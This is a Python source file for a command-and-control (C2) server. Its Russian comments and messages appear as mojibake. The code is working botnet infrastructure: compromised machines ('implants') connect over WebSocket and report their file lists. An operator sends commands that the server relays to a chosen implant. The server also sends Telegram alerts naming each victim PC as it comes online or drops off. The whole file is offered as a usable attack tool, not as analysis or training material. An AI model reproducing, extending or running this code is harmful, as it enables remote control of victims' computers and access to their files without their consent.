# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 5.0 - —Å –ø–æ–¥—Ä–æ–±–Ω—ã–º –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º –æ—à–∏–±–æ–∫) ---
import asyncio
import json
import os
from aiohttp import web

# –£–±–µ–¥–∏—Å—å, —á—Ç–æ —ç—Ç–∏ —Ñ–∞–π–ª—ã –Ω–∞ –º–µ—Å—Ç–µ
from utils import send_telegram_message
import settings

IMPLANTS, OPERATOR = {}, None

# API –¥–ª—è –æ—Ç—á–µ—Ç–æ–≤ –ø–æ–∫–∞ –≤—ã—Ä–µ–∑–∞–Ω–æ, —á—Ç–æ–±—ã –Ω–µ —Å–æ–∑–¥–∞–≤–∞—Ç—å –ª–∏—à–Ω–µ–≥–æ —à—É–º–∞
# async def handle_report(request): ...

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    client_type, client_id = None, None

    # –ó–∞–ø–æ–º–∏–Ω–∞–µ–º –∞–¥—Ä–µ—Å –∫–ª–∏–µ–Ω—Ç–∞ –¥–ª—è –ª–æ–≥–æ–≤
    peername = request.transport.get_extra_info('peername')
    client_ip = peername[0] if peername else "Unknown IP"
    print(f"[+] –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç {client_ip}")

    try:
        # --- –í–û–¢, –ë–õ–Ø–î–¨, –ì–î–ï –ü–†–û–ò–°–•–û–î–ò–¢ –ú–ê–ì–ò–Ø ---
        # –ñ–¥–µ–º –Ω–∞—á–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ, –∞ —Å —Ç–∞–π–º–∞—É—Ç–æ–º
        print(f"    [DIAG] –û–∂–∏–¥–∞—é –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –æ—Ç {client_ip}...")
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')
        print(f"    [DIAG] –ö–ª–∏–µ–Ω—Ç –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω –∫–∞–∫ '{client_type}'")

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id:
                print(f"[!] –û–®–ò–ë–ö–ê: –ò–º–ø–ª–∞–Ω—Ç —Å {client_ip} –Ω–µ –ø—Ä–∏—Å–ª–∞–ª ID. –û—Ç–∫–ª—é—á–∞—é.")
                await ws.close()
                return ws

            IMPLANTS[client_id] = {
                "ws": ws,
                "files": initial_msg.get('files', {}),
                "volume": initial_msg.get('current_volume', 50)
            }
            hostname = client_id.replace("implant_", "")
            print(f"[+] –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}")
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù:(–∏–º—è –ø–∫({hostname}))")
            await broadcast_bot_list()
        else:
            print(f"[!] –û–®–ò–ë–ö–ê: –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ç–∏–ø –∫–ª–∏–µ–Ω—Ç–∞ '{client_type}' –æ—Ç {client_ip}. –û—Ç–∫–ª—é—á–∞—é.")
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                data = json.loads(msg.data)
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            if OPERATOR: await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    # --- –ê –í–û–¢ –ò –°–ê–ú –ú–ï–ì–ê–§–û–ù ---
    except asyncio.TimeoutError:
        print(f"[!] –û–®–ò–ë–ö–ê: –ö–ª–∏–µ–Ω—Ç {client_ip} –Ω–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–ª—Å—è –≤–æ–≤—Ä–µ–º—è. –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∑–∞–∫—Ä—ã—Ç–æ.")
    except Exception as e:
        # –¢–µ–ø–µ—Ä—å –º—ã –±—É–¥–µ–º –≤–∏–¥–µ—Ç—å –õ–Æ–ë–£–Æ –æ—à–∏–±–∫—É, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–≤–µ–¥—ë—Ç –∫ –æ—Ç–∫–ª—é—á–µ–Ω–∏—é
        error_type = e.__class__.__name__
        print(f"[!!!] –ö–†–ò–¢–ò–ß–ï–°–ö–ê–Ø –û–®–ò–ë–ö–ê WEBSOCKET –æ—Ç {client_id or client_ip}: {error_type} - {e}")

    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}")
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø:(–∏–º—è –ø–∫({hostname}))")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
        else:
            # –ï—Å–ª–∏ –∫–ª–∏–µ–Ω—Ç –æ—Ç–≤–∞–ª–∏–ª—Å—è –¥–æ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
            print(f"[-] –ù–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω—ã–π –∫–ª–∏–µ–Ω—Ç {client_ip} –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed:
        await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V5.0 LOGGING EDITION) ONLINE ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")

